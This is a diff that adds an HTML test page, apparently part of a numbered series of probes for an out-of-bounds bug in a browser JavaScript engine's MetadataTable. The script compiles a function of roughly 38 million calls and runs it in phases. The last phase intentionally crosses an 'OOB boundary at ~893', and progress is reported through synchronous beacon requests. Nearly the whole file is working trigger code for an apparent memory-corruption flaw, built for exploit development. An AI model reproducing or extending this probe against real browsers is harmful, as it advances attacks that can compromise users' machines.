@@ -1,0 +1,131 @@
+<!--
+  p615b: MetadataTable overflow diagnostic — callback reachability test
+
+  p615 showed: compilation succeeds (6.7s), but ZERO callback beacons after
+  EXEC-START. Two hypotheses:
+  (a) Callbacks fire but Image.src beacons don't flush before crash/timeout
+  (b) Function with 38M bytecodes never reaches the first callback
+
+  This probe tests: bail at 5 calls, synchronous XHR beacons.
+  If callbacks ARE reached, we can safely restructure to two-phase execution.
+
+  CRASH_CLASS: HIGH (same 38M op_call function)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p615b</title>
+<script>
+function b(m) {
+  try {
+    var x = new XMLHttpRequest();
+    x.open('GET', '/beacon/' + encodeURIComponent(m), false);
+    x.send();
+  } catch(e) {
+    try { new Image().src = '/beacon/' + encodeURIComponent('SYNC-FAIL-' + m); } catch(e2){}
+  }
+}
+function bAsync(m) {
+  try { new Image().src = '/beacon/' + encodeURIComponent(m); } catch(e) {}
+}
+
+(function() {
+var OP_CALL_COUNT = 38348816;
+
+b('P615B-START');
+
+// Phase 1: Build source (same as p615)
+b('P615B-SOURCE-BUILD');
+var source;
+try {
+  source = 'x();'.repeat(OP_CALL_COUNT);
+} catch(e) {
+  b('P615B-SOURCE-OOM');
+  try {
+    var chunks = [];
+    var CHUNK = 100000;
+    var full = Math.floor(OP_CALL_COUNT / CHUNK);
+    var rem = OP_CALL_COUNT % CHUNK;
+    var one = 'x();'.repeat(CHUNK);
+    for (var i = 0; i < full; i++) chunks.push(one);
+    if (rem > 0) chunks.push('x();'.repeat(rem));
+    source = chunks.join('');
+    chunks = null; one = null;
+  } catch(e2) {
+    b('P615B-SOURCE-FAIL');
+    return;
+  }
+}
+b('P615B-SOURCE-LEN=' + source.length);
+
+// Phase 2: Compile
+b('P615B-COMPILING');
+var fn;
+try {
+  fn = new Function('x', source);
+  source = null;
+} catch(e) {
+  b('P615B-COMPILE-FAIL=' + String(e).slice(0, 200));
+  return;
+}
+b('P615B-COMPILED');
+
+// Phase 3: Execute with VERY low bail (5 calls)
+var callCount = 0;
+b('P615B-EXEC-BAIL5');
+try {
+  fn(function() {
+    callCount++;
+    if (callCount <= 5) {
+      b('P615B-CALL-' + callCount);
+    }
+    if (callCount === 5) {
+      b('P615B-BAIL-AT-5');
+      throw 'bail';
+    }
+  });
+} catch(e) {
+  b('P615B-CATCH=' + String(e).slice(0, 100));
+}
+b('P615B-TOTAL-CALLS=' + callCount);
+
+// Phase 4: If we survived, try bail at 850 (within bounds)
+if (callCount === 5) {
+  b('P615B-PHASE2-BAIL850');
+  var count2 = 0;
+  try {
+    fn(function() {
+      count2++;
+      if (count2 === 100) b('P615B-P2-100');
+      if (count2 === 500) b('P615B-P2-500');
+      if (count2 === 850) {
+        b('P615B-P2-BAIL-850');
+        throw 'bail';
+      }
+    });
+  } catch(e) {
+    b('P615B-P2-CATCH=' + String(e).slice(0, 100));
+  }
+  b('P615B-P2-TOTAL=' + count2);
+}
+
+// Phase 5: If bail at 850 worked, try bail at 950 (PAST OOB boundary at ~893)
+if (callCount === 5) {
+  b('P615B-PHASE3-BAIL950');
+  var count3 = 0;
+  try {
+    fn(function() {
+      count3++;
+      if (count3 === 893) b('P615B-P3-OOB-BOUNDARY');
+      if (count3 === 900) b('P615B-P3-900');
+      if (count3 === 950) {
+        b('P615B-P3-BAIL-950');
+        throw 'bail';
+      }
+    });
+  } catch(e) {
+    b('P615B-P3-CATCH=' + String(e).slice(0, 100));
+  }
+  b('P615B-P3-TOTAL=' + count3);
+}
+
+b('P615B-ALIVE');
+})();
+</script></head><body>p615b: MetadataTable diagnostic</body></html>
